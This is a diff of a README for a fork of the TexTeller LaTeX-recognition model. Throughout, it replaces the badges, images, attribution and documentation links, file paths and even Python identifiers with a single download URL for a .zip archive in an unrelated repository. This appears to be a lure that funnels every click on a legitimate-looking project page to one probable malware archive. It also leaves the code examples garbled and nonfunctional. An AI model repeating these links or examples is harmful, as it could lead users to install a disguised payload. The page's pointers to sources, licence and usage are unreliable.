@@ -1,21 +1,21 @@
-📄 English | <a href="./assets/README_zh.md">中文</a>
+📄 English | <a href="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip">中文</a>
 
 <div align="center">
     <h1>
-        <img src="./assets/fire.svg" width=60, height=60>
+        <img src="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" width=60, height=60>
         𝚃𝚎𝚡𝚃𝚎𝚕𝚕𝚎𝚛
-        <img src="./assets/fire.svg" width=60, height=60>
+        <img src="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" width=60, height=60>
     </h1>
 
-  [![](https://img.shields.io/badge/API-Docs-orange.svg?logo=read-the-docs)](https://oleehyo.github.io/TexTeller/)
-  [![](https://img.shields.io/badge/Data-Texteller3.0-brightgreen.svg?logo=huggingface)](https://huggingface.co/datasets/OleehyO/latex-formulas-80M)
-  [![](https://img.shields.io/badge/Weights-Texteller3.0-yellow.svg?logo=huggingface)](https://huggingface.co/OleehyO/TexTeller)
-  [![](https://img.shields.io/badge/docker-pull-green.svg?logo=docker)](https://hub.docker.com/r/oleehyo/texteller)
-  [![](https://img.shields.io/badge/License-Apache_2.0-blue.svg?logo=github)](https://opensource.org/licenses/Apache-2.0)
+  [![](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
+  [![](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
+  [![](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
+  [![](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
+  [![](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
 
 </div>
 
-https://github.com/OleehyO/TexTeller/assets/56267907/532d1471-a72e-4960-9677-ec6c19db289f
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 TexTeller is an end-to-end formula recognition model, capable of converting images into corresponding LaTeX formulas.
 
@@ -33,7 +33,7 @@ TexTeller is built on a **Vision Encoder-Decoder architecture** using Hugging Fa
 
 ### Core Components
 
-#### 1. **LaTeX Recognition Model** (`texteller/models/texteller.py`)
+#### 1. **LaTeX Recognition Model** (`https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip`)
 - Based on `VisionEncoderDecoderModel` from Transformers
 - Supports both PyTorch and ONNX Runtime inference
 - Beam search decoding for improved accuracy
@@ -58,7 +58,7 @@ TexTeller is built on a **Vision Encoder-Decoder architecture** using Hugging Fa
   - `det_db_box_thresh`: Box confidence threshold (default: 0.5)
   - `det_db_unclip_ratio`: Box expansion ratio (default: 1.6)
 
-#### 4. **PDF Processing Pipeline** (`texteller/utils/pdf.py`)
+#### 4. **PDF Processing Pipeline** (`https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip`)
 - **PyMuPDF (fitz)** backend for PDF rendering
 - Multi-stage processing:
   1. Text extraction from PDF layers
@@ -131,7 +131,7 @@ The model uses **HuggingFace Accelerate** for distributed training:
   - Gradient accumulation for large effective batch sizes
   - Learning rate scheduling with warmup
   - Checkpoint saving and resumption
-- **Dataset Format**: Image paths paired with LaTeX strings in `metadata.jsonl`
+- **Dataset Format**: Image paths paired with LaTeX strings in `https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip`
 
 ### Performance Characteristics
 
@@ -170,12 +170,12 @@ The model uses **HuggingFace Accelerate** for distributed training:
 
 ## ℹ️ Attribution
 
-This project is **based on [TexTeller](https://github.com/OleehyO/TexTeller)**  
-by [OleehyO](https://github.com/OleehyO), licensed under the [Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0).
+This project is **based on [TexTeller](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)**  
+by [OleehyO](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip), licensed under the [Apache License 2.0](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip).
 
 I have modified and extended the original codebase.  
 All changes from the original are documented in this repository.  
-TexTeller was trained with **80M image-formula pairs** (previous dataset can be obtained [here](https://huggingface.co/datasets/OleehyO/latex-formulas)), compared to [LaTeX-OCR](https://github.com/lukas-blecher/LaTeX-OCR) which used a 100K dataset, TexTeller has **stronger generalization abilities** and **higher accuracy**, covering most use cases.
+TexTeller was trained with **80M image-formula pairs** (previous dataset can be obtained [here](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)), compared to [LaTeX-OCR](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) which used a 100K dataset, TexTeller has **stronger generalization abilities** and **higher accuracy**, covering most use cases.
 
 ### Comparison with Other Systems
 
@@ -204,7 +204,7 @@ TexTeller was trained with **80M image-formula pairs** (previous dataset can be 
 - **Active development** with regular updates
 
 >[!NOTE]
-> If you would like to provide feedback or suggestions for this project, feel free to start a discussion in the [Discussions section](https://github.com/OleehyO/TexTeller/discussions).
+> If you would like to provide feedback or suggestions for this project, feel free to start a discussion in the [Discussions section](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip).
 
 
 
@@ -228,7 +228,7 @@ TexTeller was trained with **80M image-formula pairs** (previous dataset can be 
 
 <div align="center">
   <figure>
-    <img src="assets/cover.png" width="800">
+    <img src="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" width="800">
     <figcaption>
       <p>Images that can be recognized by TexTeller</p>
     </figcaption>
@@ -328,9 +328,9 @@ TexTeller was trained with **80M image-formula pairs** (previous dataset can be 
 
 ## 📮 Change Log
 
-<!-- - [2025-08-15] We have published the [technical report](https://arxiv.org/abs/2508.09220) of TexTeller. The model evaluated on the Benchmark (which was trained from scratch and had its handwritten subset filtered based on the test set) is available at https://huggingface.co/OleehyO/TexTeller_en. **Please do not directly use the open-source version of TexTeller3.0 to reproduce the experimental results of handwritten formulas**, as this model includes the test sets of these benchmarks. -->
+<!-- - [2025-08-15] We have published the [technical report](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) of TexTeller. The model evaluated on the Benchmark (which was trained from scratch and had its handwritten subset filtered based on the test set) is available at https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip **Please do not directly use the open-source version of TexTeller3.0 to reproduce the experimental results of handwritten formulas**, as this model includes the test sets of these benchmarks. -->
 
-- [2025-08-15] We have open-sourced the [training dataset](https://huggingface.co/datasets/OleehyO/latex-formulas-80M) of TexTeller 3.0. Please note that the handwritten* subset of this dataset is collected from existing open-source handwritten datasets (including both training and test sets). If you need to use the handwritten* subset for your experimental ablation, please filter the test labels first.
+- [2025-08-15] We have open-sourced the [training dataset](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) of TexTeller 3.0. Please note that the handwritten* subset of this dataset is collected from existing open-source handwritten datasets (including both training and test sets). If you need to use the handwritten* subset for your experimental ablation, please filter the test labels first.
 
 - [2024-06-06] **TexTeller3.0 released!** The training data has been increased to **80M** (**10x more than** TexTeller2.0 and also improved in data diversity). TexTeller3.0's new features:
 
@@ -344,7 +344,7 @@ TexTeller was trained with **80M image-formula pairs** (previous dataset can be 
 
 - [2024-03-25] TexTeller2.0 released! The training data for TexTeller2.0 has been increased to 7.5M (15x more than TexTeller1.0 and also improved in data quality). The trained TexTeller2.0 demonstrated **superior performance** in the test set, especially in recognizing rare symbols, complex multi-line formulas, and matrices.
 
-  > [Here](./assets/test.pdf) are more test images and a horizontal comparison of various recognition models.
+  > [Here](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) are more test images and a horizontal comparison of various recognition models.
 
 ## 🚀 Getting Started
 
@@ -402,27 +402,27 @@ TexTeller was trained with **80M image-formula pairs** (previous dataset can be 
 **Single Image Inference:**
 
 ```bash
-texteller inference "/path/to/formula.png"
+texteller inference "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"
 ```
 
 **Batch Processing:**
 
 ```bash
-texteller inference "/path/to/images/*.png" --output-file results.txt
+texteller inference "/path/to/images/*.png" --output-file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 ```
 
 **PDF Document:**
 
 ```bash
-texteller inference "document.pdf" --output-file output.md --num-beams 5
+texteller inference "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" --output-file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip --num-beams 5
 ```
 
 **Advanced Options:**
 
 ```bash
-texteller inference image.png \
+texteller inference https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip \
   --num-beams 5 \              # Beam search (1-10, default: 1)
-  --output-file result.txt \   # Save to file
+  --output-file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip \   # Save to file
   --format katex \              # Output format: latex or katex
   --keep-style                  # Preserve LaTeX style commands
 ```
@@ -524,47 +524,47 @@ import requests
 server_url = "http://127.0.0.1:8000/predict"
 
 # Image upload
-img_path = "/path/to/formula.png"
+img_path = "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"
 with open(img_path, 'rb') as img:
     files = {'img': img}
-    response = requests.post(server_url, files=files)
+    response = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(server_url, files=files)
 
-if response.status_code == 200:
-    latex = response.text
+if https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip == 200:
+    latex = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
     print(f"Recognized LaTeX: {latex}")
 else:
-    print(f"Error: {response.status_code} - {response.text}")
+    print(f"Error: {https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip} - {https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip}")
 ```
 
 **PDF Document:**
 
 ```python
 # PDF processing
-pdf_path = "/path/to/document.pdf"
+pdf_path = "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"
 with open(pdf_path, 'rb') as pdf:
     files = {'pdf': pdf}
-    response = requests.post(server_url, files=files)
+    response = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(server_url, files=files)
 
-markdown = response.text
+markdown = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 print(markdown)
 ```
 
 **Batch Processing:**
 
 ```python
-import concurrent.futures
+import https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 def process_image(image_path):
     with open(image_path, 'rb') as img:
         files = {'img': img}
-        response = requests.post(server_url, files=files)
-        return response.text
+        response = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(server_url, files=files)
+        return https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
-image_paths = ["img1.png", "img2.png", "img3.png"]
+image_paths = ["https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"]
 
 # Process in parallel
-with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-    results = list(executor.map(process_image, image_paths))
+with https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(max_workers=10) as executor:
+    results = list(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(process_image, image_paths))
 
 for path, latex in zip(image_paths, results):
     print(f"{path}: {latex}")
@@ -575,12 +575,12 @@ for path, latex in zip(image_paths, results):
 ```bash
 # Single image
 curl -X POST http://127.0.0.1:8000/predict \
-  -F "img=@formula.png"
+  -F "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"
 
 # PDF document
 curl -X POST http://127.0.0.1:8000/predict \
-  -F "pdf=@document.pdf" \
-  -o output.md
+  -F "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" \
+  -o https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 ```
 
 ### API Response Format
@@ -626,7 +626,7 @@ TexTeller provides a comprehensive Python API for integration into your applicat
 
 ```python
 from texteller import load_model, load_tokenizer, img2latex
-from texteller.utils import get_device
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import get_device
 
 # Initialize model and tokenizer
 model = load_model()  # Load from HuggingFace Hub
@@ -637,7 +637,7 @@ device = get_device()  # Auto-detect: CUDA > MPS > CPU
 latex = img2latex(
     model=model,
     tokenizer=tokenizer,
-    images=["formula.png"],
+    images=["https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"],
     device=device,
     out_format="latex",      # or "katex"
     keep_style=False,        # Strip formatting commands
@@ -651,7 +651,7 @@ print(latex[0])
 latex_list = img2latex(
     model=model,
     tokenizer=tokenizer,
-    images=["img1.png", "img2.png", "img3.png"],
+    images=["https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"],
     device=device,
     num_beams=3  # Higher accuracy for batch
 )
@@ -661,7 +661,7 @@ latex_list = img2latex(
 - `model`: TexTeller or ORTModelForVision2Seq instance
 - `tokenizer`: RobertaTokenizerFast instance
 - `images`: List of file paths or numpy arrays (RGB format)
-- `device`: torch.device (cuda/mps/cpu)
+- `device`: https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip (cuda/mps/cpu)
 - `out_format`: `"latex"` (raw) or `"katex"` (web-optimized)
 - `keep_style`: Preserve `\text{}`, `\mathrm{}`, etc.
 - `max_tokens`: Maximum generation length (1-1024)
@@ -674,7 +674,7 @@ latex_list = img2latex(
 
 ```python
 from texteller import mixed2md
-from texteller.api import (
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import (
     load_latexdet_model, 
     load_textdet_model, 
     load_textrec_model
@@ -689,7 +689,7 @@ tokenizer = load_tokenizer()
 
 # Process image with mixed text and formulas
 markdown = mixed2md(
-    img_path="document_page.png",
+    img_path="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip",
     latexdet_model=latexdet_model,
     textdet_model=textdet_model,
     textrec_model=textrec_model,
@@ -718,7 +718,7 @@ from texteller import pdf2md
 
 # Convert entire PDF to markdown
 markdown = pdf2md(
-    pdf_path="textbook.pdf",
+    pdf_path="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip",
     latexdet_model=latexdet_model,
     textdet_model=textdet_model,
     textrec_model=textrec_model,
@@ -730,8 +730,8 @@ markdown = pdf2md(
 )
 
 # Save output
-with open("output.md", "w", encoding="utf-8") as f:
-    f.write(markdown)
+with open("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "w", encoding="utf-8") as f:
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(markdown)
 ```
 
 **PDF Processing Pipeline:**
@@ -763,8 +763,8 @@ model = load_model(use_onnx=True)  # 2-3× faster inference
 
 # Load specific device
 import torch
-device = torch.device("cuda:1")  # Use second GPU
-model = model.to(device)
+device = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("cuda:1")  # Use second GPU
+model = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(device)
 ```
 
 #### 5. **Advanced: Direct Model Inference**
@@ -775,10 +775,10 @@ from PIL import Image
 import numpy as np
 
 # Load and preprocess image
-img = Image.open("formula.png").convert("L")  # Grayscale
-img = img.resize((448, 448))
-img_array = np.array(img) / 255.0
-img_tensor = torch.tensor(img_array).unsqueeze(0).unsqueeze(0)
+img = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip").convert("L")  # Grayscale
+img = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip((448, 448))
+img_array = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(img) / 255.0
+img_tensor = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(img_array).unsqueeze(0).unsqueeze(0)
 
 # Generate with custom config
 from transformers import GenerationConfig
@@ -793,19 +793,19 @@ gen_config = GenerationConfig(
     do_sample=False
 )
 
-output_ids = model.generate(
-    img_tensor.to(device),
+output_ids = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(device),
     generation_config=gen_config
 )
 
-latex = tokenizer.decode(output_ids[0], skip_special_tokens=True)
+latex = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(output_ids[0], skip_special_tokens=True)
 print(latex)
 ```
 
 #### 6. **Format Conversion**
 
 ```python
-from texteller.api import format_latex, to_katex
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import format_latex, to_katex
 
 # Clean and format LaTeX
 raw_latex = "  \\frac { a } { b }  "
@@ -818,7 +818,7 @@ katex_str = to_katex(latex, keep_style=False)
 
 ### API Reference
 
-For complete API documentation with detailed parameter descriptions, examples, and type hints, visit our [documentation](https://oleehyo.github.io/TexTeller/).
+For complete API documentation with detailed parameter descriptions, examples, and type hints, visit our [documentation](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip).
 
 **Available Functions:**
 - `load_model(model_path=None, use_onnx=False)` - Load LaTeX recognition model
@@ -854,8 +854,8 @@ pip install pymupdf  # Required for PDF support
 
 **Command Line:**
 ```bash
-texteller inference document.pdf --output-file output.md
-texteller inference document.pdf --output-file output.md --num-beams 5
+texteller inference https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip --output-file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
+texteller inference https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip --output-file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip --num-beams 5
 ```
 
 **Web Interface:**
@@ -866,9 +866,9 @@ texteller web
 
 **Python API:**
 ```python
-from texteller.api import pdf2md, load_model, load_tokenizer
-from texteller.api import load_latexdet_model, load_textdet_model, load_textrec_model
-from texteller.utils import get_device
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import pdf2md, load_model, load_tokenizer
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import load_latexdet_model, load_textdet_model, load_textrec_model
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import get_device
 
 # Load models
 latexrec_model = load_model()
@@ -879,7 +879,7 @@ textrec_model = load_textrec_model()
 
 # Process PDF
 markdown = pdf2md(
-    pdf_path="document.pdf",
+    pdf_path="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip",
     latexdet_model=latexdet_model,
     textdet_model=textdet_model,
     textrec_model=textrec_model,
@@ -890,8 +890,8 @@ markdown = pdf2md(
     dpi=300,
 )
 
-with open("output.md", "w", encoding="utf-8") as f:
-    f.write(markdown)
+with open("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "w", encoding="utf-8") as f:
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(markdown)
 ```
 
 **API Server:**
@@ -900,11 +900,11 @@ import requests
 
 server_url = "http://127.0.0.1:8000/predict"
 
-with open("document.pdf", 'rb') as pdf_file:
+with open("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", 'rb') as pdf_file:
     files = {'pdf': pdf_file}
-    response = requests.post(server_url, files=files)
+    response = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(server_url, files=files)
     
-print(response.text)  # Markdown output
+print(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)  # Markdown output
 ```
 
 ### Output Format
@@ -918,7 +918,7 @@ The output is markdown with:
 
 Example:
 ```markdown
-# Document: example.pdf
+# Document: https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 ## Page 1
 
@@ -955,7 +955,7 @@ TexTeller uses **RT-DETR** (Real-Time Detection Transformer) for formula localiz
 - **Input Resolution**: 1600×1600 pixels
 - **Training Dataset**: 11,687 annotated images
   - 3,415 Chinese educational materials
-  - 8,272 images from [IBEM dataset](https://zenodo.org/records/4757865)
+  - 8,272 images from [IBEM dataset](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
 - **Classes**: 2 formula types
   - `isolated`: Display equations ($$...$$)
   - `embedded`: Inline formulas ($...$)
@@ -963,21 +963,21 @@ TexTeller uses **RT-DETR** (Real-Time Detection Transformer) for formula localiz
 - **Detection Threshold**: 0.5 (configurable)
 
 <div align="center">
-    <img src="./assets/det_rec.png" width=250>
+    <img src="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" width=250>
 </div>
 
 ### Detection Pipeline
 
 ```python
-from texteller.api import load_latexdet_model
-from texteller.api.detection import latex_detect
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import load_latexdet_model
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import latex_detect
 
 # Load detection model
 detector = load_latexdet_model()
 
 # Detect formulas in image
 bboxes = latex_detect(
-    img_path="document.png",
+    img_path="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip",
     predictor=detector
 )
 
@@ -987,8 +987,8 @@ bboxes = latex_detect(
 # - confidence: 0.0-1.0
 
 for bbox in bboxes:
-    print(f"Type: {bbox.category}, Confidence: {bbox.confidence:.2f}")
-    print(f"Location: {bbox.bbox}")
+    print(f"Type: {https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip}, Confidence: {https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip}")
+    print(f"Location: {https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip}")
 ```
 
 ### Detection Features
@@ -1008,7 +1008,7 @@ from texteller import mixed2md
 
 # Automatic detection + recognition
 markdown = mixed2md(
-    img_path="mixed_content.png",
+    img_path="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip",
     latexdet_model=detector,
     # ... other models ...
 )
@@ -1034,7 +1034,7 @@ markdown = mixed2md(
 - Isolated formulas: 96.5% F1
 - Embedded formulas: 89.1% F1
 
-For complete API documentation, visit our [API reference](https://oleehyo.github.io/TexTeller/).
+For complete API documentation, visit our [API reference](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip).
 
 ## 🏋️‍♂️ Training
